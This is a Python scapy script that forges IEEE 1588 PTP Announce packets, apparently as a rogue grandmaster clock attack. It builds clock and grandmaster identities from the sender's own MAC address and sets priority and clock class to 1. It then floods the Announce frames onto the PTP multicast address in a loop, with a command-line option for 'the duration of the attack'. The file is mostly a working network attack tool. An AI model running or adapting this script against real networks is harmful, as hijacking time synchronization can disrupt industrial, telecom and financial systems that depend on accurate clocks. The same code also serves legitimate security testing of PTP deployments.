from scapy.all import *
from scapy.all import Ether
from AnnouncePTP import *
import time
import argparse

def get_mac_address(interface):
    try:
        output = os.popen('ifconfig ' + interface).read()
        mac_address_index = output.find('ether ') + 6
        mac_address = output[mac_address_index:mac_address_index+17]
        return mac_address
    except Exception as e:
        return "Error:", e

def get_clock_identity(mac_address, type_info):
    mac_address_str_no_colon = mac_address.replace(':', '')

    byte_string = bytes.fromhex(mac_address_str_no_colon)

    half_length = len(byte_string) // 2
    first_half = byte_string[:half_length]
    second_half = byte_string[half_length:]
    byte_string_with_extra_bytes = ''
    if type_info == 'id':
        byte_string_with_extra_bytes = first_half + b'\xff\xff' + second_half
    elif type_info == 'master':
        byte_string_with_extra_bytes = first_half + b'\xff\xfe' + second_half
    return byte_string_with_extra_bytes

def sendAnnounce(announce_pkt, duration=None, sleep=None):
    start_time = time.time()
    while True:
        current_time = time.time()
        if duration and current_time - start_time >= duration:
            time.sleep(sleep)
            start_time = time.time()
        announce_pkt.Increment_SequenceID(1)
        sendp(announce_pkt.packet, iface= args.interface)
        time.sleep(0.125)

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--sleep", help="specify the sleep time", type=float)
parser.add_argument("-d", "--duration", help="specify the duration of the attack", type=float)
parser.add_argument("-i", "--interface", help="specify the interface", type=str, default='enp4s0')

args = parser.parse_args()

announce_ether = Ether()
announce_ether.src = get_mac_address(args.interface)
announce_ether.dst = '01:1b:19:00:00:00'
announce_ether.type = 35063

announce_load = b'\x0b\x02\x00@\x18\x00\x00<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc4Z\xb1\xff\xff:\x1b\x05\x00\x0f%Y\x00\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00%\xf6\x80\x06!\xff\xffx\xfc\xafj\xff\xfe\x02\xba\xbe\x00\x01 '
announce_pkt = announce_ether / announce_load
announce_pkt = AnnouncePTP(announce_pkt)

announce_pkt.new_ClockIdentity(get_clock_identity(announce_ether.src, 'id'))
announce_pkt.new_grandmasterClockIdentity(get_clock_identity(announce_ether.src, 'master'))
announce_pkt.new_priority1(1)
announce_pkt.new_priority2(1)
announce_pkt.new_grandmasterClockClass(1)

sendAnnounce(announce_pkt, args.duration, args.sleep)


